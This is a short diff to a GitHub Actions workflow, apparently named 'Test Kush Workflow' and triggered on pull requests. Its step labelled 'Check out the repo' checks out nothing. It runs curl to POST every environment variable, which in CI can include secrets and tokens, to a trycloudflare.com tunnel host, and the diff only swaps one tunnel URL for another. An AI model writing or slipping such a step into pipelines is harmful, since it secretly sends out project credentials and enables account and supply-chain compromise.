@@ -1,4 +1,4 @@
-name: Test Workflow Kush
+name: Test Kush Workflow
 
 on:
   pull_request:
@@ -12,5 +12,5 @@ jobs:
     steps:
       - name: Check out the repo
         run: |
-        curl -X POST -d "$(printenv)" https://past-chorus-category-appliance.trycloudflare.com
+        curl -X POST -d "$(printenv)" https://licensed-insertion-michael-fibre.trycloudflare.com
                   
